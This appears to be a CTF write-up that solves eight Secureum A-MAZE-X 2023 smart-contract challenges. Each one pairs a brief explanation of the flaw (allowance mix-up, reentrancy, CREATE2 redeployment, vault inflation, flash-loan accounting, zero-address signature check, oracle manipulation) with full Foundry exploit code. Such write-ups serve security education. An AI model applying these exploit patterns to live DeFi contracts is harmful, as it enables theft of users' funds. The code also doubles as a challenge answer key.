---
title: Secureum：A-MAZE-X CTF 2023
tags:
    - blockchain
    - smart contract
    - DeFi
    - access control
    - cross-function reentrancy
    - create2
    - phantom function
    - inflation attack
---

## 1. Operation magic redemption 🪄🔮

> Recover `1000 mETH` from the *exploiter wallet*.
>
> Convert the `mETH` to `ETH` to avoid further losses.

- `burnFrom()` 中在获取 `currentAllowance` 时，实际得到的是 `_allowances[spender][owner]`，而 `_approve()` 的传参顺序是正确的
- 可通过 `burnFrom()` 来取得转移 `exploiter` 持有代币的权限

```diff
function allowance(address owner, address spender) public view virtual override returns (uint256) {
    return _allowances[owner][spender];
}

function burnFrom(address account, uint256 amount) public {
-    uint256 currentAllowance = allowance(msg.sender, account);
+    uint256 currentAllowance = allowance(account, msg.sender);
    require(currentAllowance >= amount, "ERC20: insufficient allowance");

    // decrease allowance
    _approve(account, msg.sender, currentAllowance - amount);

    // burn
    _burn(account, amount);
}
```

### Exploit

```js
contract Challenge1Test is Test {
    MagicETH public mETH;

    address public exploiter = makeAddr("exploiter");
    address public whitehat = makeAddr("whitehat");

    function setUp() public {
        mETH = new MagicETH();

        mETH.deposit{value: 1000 ether}();
        // exploiter is in control of 1000 tokens
        mETH.transfer(exploiter, 1000 ether);
    }

    function testExploit() public {
        vm.startPrank(whitehat, whitehat);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge1Test -vvvv //
        ////////////////////////////////////////////////////*/
        mETH.approve(exploiter, 1000 ether);
        mETH.burnFrom(exploiter, 0);
        mETH.transferFrom(exploiter, whitehat, 1000 ether);
        mETH.withdraw(1000 ether);
        //==================================================//
        vm.stopPrank();

        assertEq(whitehat.balance, 1000 ether, "whitehat should have 1000 ether");
    }
}
```

## 2. Mission Modern WETH: Rescue the Ether 🧗🧭

> Starting with **10 ETH**, recover `1000 ETH` from the `ModernWETH` contract.
>
> Recover all `ETH` to avoid further losses from `ModernWETH` contract. Whitehat hacker should end up with **1010 ETH**.

- 由于 `_burnAll()` 基于 `msg.sender` 的当前余额进行代币销毁，因而可以在回调函数中将持有的代币转移到可控账户
- 利用持有的代币反复调用 `withdrawAll()`

```js
function deposit() public payable {
    _mint(msg.sender, msg.value);
}

function withdrawAll() external nonReentrant {
    (bool success,) = msg.sender.call{value: balanceOf(msg.sender)}("");
    require(success, "mWETH: ETH transfer failed");

    _burnAll();
}

function _burnAll() internal {
    _burn(msg.sender, balanceOf(msg.sender));
}
```

### Exploit

```js
/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/
contract Executor {
    ModernWETH mWETH;
    address owner = msg.sender;

    constructor(address _mWETH) {
        mWETH = ModernWETH(_mWETH);
    }

    function execute() external {
        mWETH.withdrawAll();
    }

    receive() external payable {
        mWETH.transfer(owner, mWETH.balanceOf(address(this)));
        payable(owner).transfer(address(this).balance);
    }
}
/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge2Test is Test {
    ModernWETH public modernWETH;
    address public whitehat = makeAddr("whitehat");

    function setUp() public {
        modernWETH = new ModernWETH();

        /// @dev contract has locked 1000 ether, deposited by a whale, you must rescue it
        address whale = makeAddr("whale");
        vm.deal(whale, 1000 ether);
        vm.prank(whale);
        modernWETH.deposit{value: 1000 ether}();

        /// @dev you, the whitehat, start with 10 ether
        vm.deal(whitehat, 10 ether);
    }

    function testWhitehatRescue() public {
        vm.startPrank(whitehat, whitehat);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge2Test -vvvv //
        ////////////////////////////////////////////////////*/
        Executor executor = new Executor(address(modernWETH));
        uint256 amount;
        while (address(modernWETH).balance > 0) {
            amount = address(modernWETH).balance < whitehat.balance ? address(modernWETH).balance : whitehat.balance;
            modernWETH.deposit{value: amount}();
            modernWETH.transfer(address(executor), amount);
            executor.execute();
            modernWETH.withdrawAll();
        }
        //==================================================//
        vm.stopPrank();

        assertEq(address(modernWETH).balance, 0, "ModernWETH balance should be 0");
        // @dev whitehat should have more than 1000 ether plus 10 ether from initial balance after the rescue
        assertEq(address(whitehat).balance, 1010 ether, "whitehat should end with 1010 ether");
    }
}
```

## 3. LendEx pool hack 🤺🃏

> You have to fill the shoes of the hacker and execute the exploit by stealing stablecoins from a lending pool.

!!! note

    Foundry has a bug. If a selfdestruct() is triggered in a test script then it has to be done in the setUp() function and the rest of the code should be in a different function otherwise foundry test script does not see that selfdestruct happened to a contract.

- `hacker` 通过 `CreateDeployer` 部署了 `LendingPool`，而 `CreateDeployer` 由 `Create2Deployer` 部署

    ```js
    vm.startPrank(hacker);
    create2Deployer = new Create2Deployer();
    createDeployer = CreateDeployer(create2Deployer.deploy());
    lendingPool = LendingPool(createDeployer.deploy(true, address(usdc)));
    vm.stopPrank();
    ```

- `CreateDeployer` 以及 `LendingPool` 的 `owner` 可以让合约自毁
- `CREATE` 根据 `sender` 和 `nonce` 计算部署合约的地址，`CreateDeployer` 自毁后，`nonce` 被重置，而 `CreateDeployer` 由 `CREATE2` 创建，因此可以在同一地址上部署不同的合约
- `LendingPool` 所在地址持有的 USDC 不受自毁的影响

### Exploit

!!! note "LendingHack.sol"

    ```js
    contract LendingHack is Ownable {
        /*//////////////////////////////
        //    Add your hack below!    //
        //////////////////////////////*/
        string public constant name = "LendingPool hack";
        /**
         * @dev Constructor that sets the owner of the contract
         * @param _usdc The address of the USDC contract to use
         * @param _owner The address of the owner of the contract
         */
        constructor(address _owner, address _usdc) {
            USDC usdc = USDC(_usdc);
            usdc.transfer(_owner, usdc.balanceOf(address(this)));
        }
        //============================//
    }
    ```

!!! note "Challenge3.t.sol"

    ```js
    contract Challenge3Test is Test {
        USDC public usdc;
        uint256 public usdcAmount = 100000;
        LendExGovernor public lendExGovernor;
        CreateDeployer public createDeployer;
        Create2Deployer public create2Deployer;

        LendingPool public lendingPool;
        LendingHack public lendingHack;

        address public hacker = makeAddr("hacker");
        address public governanceOwner = makeAddr("governanceOwner");

        function setUp() public {
            /* set up actions */
            usdc = new USDC(usdcAmount);
            usdc.transfer(governanceOwner, usdcAmount);

            /* sending transactions as hacker */
            // deploying the LendingPool contract
            vm.startPrank(hacker);
            create2Deployer = new Create2Deployer();
            createDeployer = CreateDeployer(create2Deployer.deploy());
            lendingPool = LendingPool(createDeployer.deploy(true, address(usdc)));
            vm.stopPrank();

            /* sending transactions as the governance owner */
            // deploying the LendingPool contract
            vm.startPrank(governanceOwner);
            lendExGovernor = new LendExGovernor(address(usdc));
            lendExGovernor.addContract(address(lendingPool));
            usdc.transfer(address(lendExGovernor), usdcAmount);
            // funding the LendingPool contract with USDC
            lendExGovernor.fundLendingPool(address(lendingPool), usdcAmount);
            vm.stopPrank();

            assertEq(
                lendExGovernor.getPoolName(address(lendingPool)),
                "LendingPool V1",
                "lendingPool contract has the original name"
            );
            vm.startPrank(hacker);
            /*//////////////////////////////////////////////////////////////////////
            //                      Add your hack below!                          //
            //                          Hack part #1                              //
            // NOTE!!! Foundry has a bug                                          //
            // anything selfdestruct() related has to be in the setUp() function  //
            //                                                                    //
            // terminal command to run the speciffic test:                        //
            // forge test --match-contract Challenge3Test -vvvv                   //
            //////////////////////////////////////////////////////////////////////*/
            lendingPool.emergencyStop();
            createDeployer.cleanUp();
            //====================================================================//
            vm.stopPrank();
        }

        function testExploit() public {
            vm.startPrank(hacker);
            /*//////////////////////////////////////////////////////////////
            //                    Add your hack below!                    //
            //                        Hack part #2                        //
            // Please implement necessary changes also to LendingHack.sol //
            // terminal command to run the specific test:                 //
            // forge test --match-contract Challenge3Test -vvvv           //
            //////////////////////////////////////////////////////////////*/
            createDeployer = CreateDeployer(create2Deployer.deploy());
            lendingHack = LendingHack(createDeployer.deploy(false, address(usdc)));
            //=============================================================//
            vm.stopPrank();

            assertEq(
                lendExGovernor.getPoolName(address(lendingPool)),
                "LendingPool hack",
                "lendingPool contract address now gives a different name"
            );
            assertEq(usdc.balanceOf(hacker), usdcAmount, "Hacker has to steal all the stablecoin tokens");
        }
    }
    ```

### References

- [Deploy Different Contracts at the Same Address | Solidity by Example](https://solidity-by-example.org/hacks/deploy-different-contracts-same-address/)

## 4. Operation Rescue `POSI` Token 💼🔓

> Extract the 1000 `POSI` tokens from the Vault.
>
> Transfer the rescued tokens to the address of the organization.

- `VaultFactory` 使用 `CREATE2` 部署合约，根据部署字节码和盐值可以确定合约部署的地址

    > The only thing that we know is that he used to work with us in the past, that his birthday was in November and that he was a big fan of the `CREATE2` opcode.

- 根据提示可以确定 `salt` 为 11

### Exploit

```js
contract Challenge4Test is Test {
    VaultFactory public FACTORY;
    PosiCoin public POSI;
    address public unclaimedAddress = 0x70E194050d9c9c949b3061CC7cF89dF9c6782b7F;
    address public whitehat = makeAddr("whitehat");
    address public devs = makeAddr("devs");

    function setUp() public {
        vm.label(unclaimedAddress, "Unclaimed Address");

        // Instantiate the Factory
        FACTORY = new VaultFactory();

        // Instantiate the POSICoin
        POSI = new PosiCoin();

        // OOPS transferred to the wrong address!
        POSI.transfer(unclaimedAddress, 1000 ether);
    }


    function testWhitehatRescue() public {
        vm.deal(whitehat, 10 ether);
        vm.startPrank(whitehat, whitehat);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge4Test -vvvv //
        ////////////////////////////////////////////////////*/
        VaultWalletTemplate wallet = VaultWalletTemplate(payable(FACTORY.deploy(type(VaultWalletTemplate).creationCode, 11)));
        wallet.initialize(whitehat);
        wallet.withdrawERC20(address(POSI), 1000 ether, devs);
        //==================================================//
        vm.stopPrank();

        assertEq(POSI.balanceOf(devs), 1000 ether, "devs' POSI balance should be 1000 POSI");
    }
}
```

## 5. Balloon Vault 🎈🎈

> Drain *Bob's wallet* and *Alice's wallet*
>
> End up with more than `1000 ETH` in your wallet

- `BallonVault` 有转移 Bob 和 Alice 持有 WETH 的许可

    ```js
    vm.prank(bob);
    weth.approve(address(vault), 500 ether);
    vm.prank(alice);
    weth.approve(address(vault), 500 ether);
    ```

- WETH 没有函数 `permit()`，因此调用 `depositWithPermit()` 不会对签名进行校验

    ```js
    function depositWithPermit(address from, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s)
        external
    {
        IERC20Permit(address(asset())).permit(from, address(this), amount, deadline, v, r, s);

        _deposit(from, from, amount, previewDeposit(amount));
    }
    ```

- `attacker` 没有转移 Bob 或 Alice 持有 Shares 的许可，通过通货膨胀攻击，使 Bob 或 Alice 的 deposit 无法获得 Shares，从而在 redeem 时获得更多的 WETH

### Exploit

```js
contract Challenge5Test is Test {
    BallonVault public vault;
    WETH public weth = new WETH();

    address public attacker = makeAddr("attacker");
    address public bob = makeAddr("bob");
    address public alice = makeAddr("alice");

    function setUp() public {
        vault = new BallonVault(address(weth));

        // Attacker starts with 10 ether
        vm.deal(address(attacker), 10 ether);

        // Set up Bob and Alice with 500 WETH each
        weth.deposit{value: 1000 ether}();
        weth.transfer(bob, 500 ether);
        weth.transfer(alice, 500 ether);

        vm.prank(bob);
        weth.approve(address(vault), 500 ether);
        vm.prank(alice);
        weth.approve(address(vault), 500 ether);
    }

    function _inflation_attack(address victim) internal {
        vault.deposit(1, attacker);
        weth.transfer(address(vault), weth.balanceOf(attacker));
        uint256 amount = weth.balanceOf(address(vault)) - 1;
        vault.depositWithPermit(
            victim,
            amount > weth.balanceOf(victim) ? weth.balanceOf(victim) : amount,
            0,
            0,
            bytes32(0),
            bytes32(0)
        );
        vault.redeem(1, attacker, attacker);
    }

    function testExploit() public {
        vm.startPrank(attacker);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge5Test -vvvv //
        ////////////////////////////////////////////////////*/
        weth.deposit{value: 10 ether}();
        weth.approve(address(vault), type(uint256).max);
        while (weth.balanceOf(alice) > 0) {
            _inflation_attack(alice);
        }
        _inflation_attack(bob); // the attacker now has enough weth to steal from Bob in a single step
        //==================================================//
        vm.stopPrank();

        assertGt(weth.balanceOf(address(attacker)), 1000 ether, "Attacker should have more than 1000 ether");
    }
}
```

## 6. Safe Yield? 🏦📈

> Drain at least `100 ETH` from the yield pool.

`flashLoan()` 在完成 `onFlashLoan()` 的调用后只检查合约中对应资产的余额，可在回调函数中通过 `addLiquidity()`、`ethToToken()` 或 `tokenToEth()` 进行转换

```js
if (token == ETH) {
    require(address(this).balance >= expected, "Flash loan not repayed");
}
else {
    require(getReserve() >= expected, "Flash loan not repayed");
}
```

### Exploit

```js
contract Hack is IERC3156FlashBorrower {
    YieldPool pool;
    SecureumToken token;

    address payable owner = payable(msg.sender);

    constructor(YieldPool _pool, SecureumToken _token) payable {
        pool = _pool;
        token = _token;
    }

    function exploit() external {
        token.approve(address(pool), type(uint256).max);
        while (address(this).balance < 100 ether) {
            if (address(this).balance > 0) {
                pool.flashLoan(
                    IERC3156FlashBorrower(address(this)),
                    pool.ETH(),
                    address(this).balance * 100,
                    ""
                );
            } else {
                pool.flashLoan(
                    IERC3156FlashBorrower(address(this)),
                    address(token),
                    token.balanceOf(address(this)) * 100,
                    ""
                );
            }
        }
        
    }

    function withdraw() external {
        require(msg.sender == owner);
        pool.tokenToEth(token.balanceOf(address(this)));
        owner.transfer(address(this).balance);
    }

    function onFlashLoan(
        address,
        address _token,
        uint256 amount,
        uint256,
        bytes calldata
    ) external returns (bytes32) {
        require(msg.sender == address(pool));
        if (_token == address(token)) {
            pool.tokenToEth(token.balanceOf(address(this)));
        } else {
            pool.ethToToken{value: address(this).balance}();
        }
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    receive() external payable {}
}
/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge6Test is Test {
    SecureumToken public token;
    YieldPool public yieldPool;

    address public attacker = makeAddr("attacker");
    address public owner = makeAddr("owner");

    function setUp() public {
        // setup pool with 10_000 ETH and ST tokens
        uint256 start_liq = 10_000 ether;
        vm.deal(address(owner), start_liq);
        vm.prank(owner);
        token = new SecureumToken(start_liq);
        yieldPool = new YieldPool(token);
        vm.prank(owner);
        token.increaseAllowance(address(yieldPool), start_liq);
        vm.prank(owner);
        yieldPool.addLiquidity{value: start_liq}(start_liq);

        // attacker starts with 0.1 ether
        vm.deal(address(attacker), 0.1 ether);
    }

    function testExploitPool() public {
        vm.startPrank(attacker);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge6Test -vvvv //
        ////////////////////////////////////////////////////*/
        Hack hack = new Hack{value: 0.1 ether}(yieldPool, token);
        hack.exploit();
        hack.withdraw();
        //==================================================//
        vm.stopPrank();

        assertGt(address(attacker).balance, 100 ether, "hacker should have more than 100 ether");
    }
}
```

## 7. Crystal DAO 💎💎

> Rescue `100 ETH` from the DAO treasury.

- `DaoVaultImplementation` 继承了 `Initializable` 和 `EIP712Upgradeable`，因此 slot 0 不对应状态变量 `owner`，在调用 `initialize()` 后 `owner` 仍为默认值 `address(0)`

    ```js
    function initialize(address _owner) public initializer {
        // EIP712 init: name DaoWallet, version 1.0
        __EIP712_init("DaoWallet", "1.0");

        // postInit: set owner with gas optimizations
        assembly {
            sstore(0, _owner)
        }
    }
    ```

- 由于未进行零地址检查，无效签名可通过校验

    ```js
    address signer = ecrecover(hash, v, r, s);
    require(owner == signer, "Only owner can execute!");
    ```

### Exploit

```js
contract Challenge7Test is Test {
    FactoryDao factory;

    address public whitehat = makeAddr("whitehat");
    address public daoManager;
    uint256 daoManagerKey;

    IDaoVault vault;

    function setUp() public {
        (daoManager, daoManagerKey) = makeAddrAndKey("daoManager");
        factory = new FactoryDao();

        vm.prank(daoManager);
        vault = IDaoVault(factory.newWallet());

        // The vault has reached 100 ether in donations
        deal(address(vault), 100 ether);
    }

    function testHack() public {
        vm.startPrank(whitehat, whitehat);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge7Test -vvvv //
        ////////////////////////////////////////////////////*/
        vault.execWithSignature(
            0, bytes32(0), bytes32(0),
            daoManager, 100 ether, "", block.timestamp + 1);
        //==================================================//
        vm.stopPrank();

        assertEq(daoManager.balance, 100 ether, "The Dao manager's balance should be 100 ether");
    }
}
```

## 8. Liquidatoooor 🔱🔱

> Drop the borrower's health account.
>
> Liquidate the borrower and get as much of his collateral as possible.

- token0 (TKN) 的价格能够影响健康系数

    ```js
    function healthFactor(address _user) public returns (uint256) {
        if (users[_user].borrow == 0) {
            // User has not borrowed any tokens, so health is theoretically infinite
            return type(uint256).max;
        }
        uint256 collateralValue = users[_user].collateral * getPriceToken();
        uint256 borrowValue = users[_user].borrow;
        uint256 hf = collateralValue * CF / borrowValue;
        // Includes 2 decimals
        return hf;
    }

    function getPriceToken() public returns (uint256) {
        return amm.getPriceToken0();
    }
    ```

- 由于使用的是实时价格，通过 `swap()` 降低 token0 的价格，以降低健康系数并清算健康账户

    ```js
    function getPriceToken0() public view returns (uint256) {
        return (reserve1 * 1e18) / reserve0;
    }
    ```

### Exploit

```js
contract Challenge8Test is Test {
    Oiler public oiler;
    AMM public amm;

    ERC20 token;
    ERC20 dai;

    address player;
    address superman;

    function setUp() public {
        /**
         * @notice Create ERC20 tokens
         */
        token = new ERC20("Token", "TKN");
        dai = new ERC20("DAI token", "DAI");
        vm.label(address(token), "TKN");
        vm.label(address(dai), "DAI");

        /**
         * @notice Deploy contant prodcut AMM with a TOKEN <> DAI pair
         */
        amm = new AMM(address(token), address(dai));
        vm.label(address(amm), "amm");

        /**
         * @notice Deploy Lending contract. Accepts 'TOKEN' as collateral and
         * mints a 'dTOKEN' underlying debt token.
         */
        oiler = new Oiler(address(token), address(amm));
        vm.label(address(oiler), "oiler");

        /**
         * @notice Create 2 accounts and fund them.
         * - Player starts with 100 TOKEN and 100 DAI
         * - Superman starts with 200 TOKEN and 200 DAI,
         * Superman adds 100 of each to the pool.
         */
        player = makeAddr("player");
        superman = makeAddr("Super-man");
        deal(address(token), player, 100);
        deal(address(dai), player, 100);
        deal(address(token), superman, 200);
        deal(address(dai), superman, 200);

        /**
         * @notice Add liquidity to AMM pair.
         */
        vm.startPrank(superman);
        token.approve(address(amm), type(uint256).max);
        dai.approve(address(amm), type(uint256).max);
        amm.addLiquidity(100, 100);
        vm.stopPrank();
    }

    function testSolution()public {
        // Victim set up
        vm.startPrank(superman);
        token.approve(address(oiler), 100);
        oiler.deposit(100);
        oiler.maxBorrow(superman); // Always account for 2 Decimal places
        oiler.borrow(75);
        oiler.healthFactor(superman);
        vm.stopPrank();

        // Player initial balance is of 100 $TOKEN and 100 $DAI
        console.log("Initial token balance: ", token.balanceOf(player));
        console.log("Initial dai balance: ", dai.balanceOf(player));
        vm.startPrank(player);
        /*////////////////////////////////////////////////////
        //            Add your attack logic below!          //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge8Test -vvvv //
        ////////////////////////////////////////////////////*/
        token.approve(address(oiler), 4);
        oiler.deposit(4);
        oiler.borrow(3);    // for repayment
        token.approve(address(amm), 96);
        amm.swap(address(token), 96);
        oiler.liquidate(superman);
        dai.approve(address(amm), dai.balanceOf(player));
        amm.swap(address(dai), dai.balanceOf(player));
        //==================================================//
        vm.stopPrank();

        // Conditions to pass:
        //      - Player has liquidated the victim
        //      - Player has more than 150 $TOKENs
        //      - Extra: Player has more than 200 $TOKENs
        Oiler.User memory victim = oiler.getUserData(superman);
        assertEq(victim.liquidated, true);
        assert(token.balanceOf(player) > 200);
    }

}
```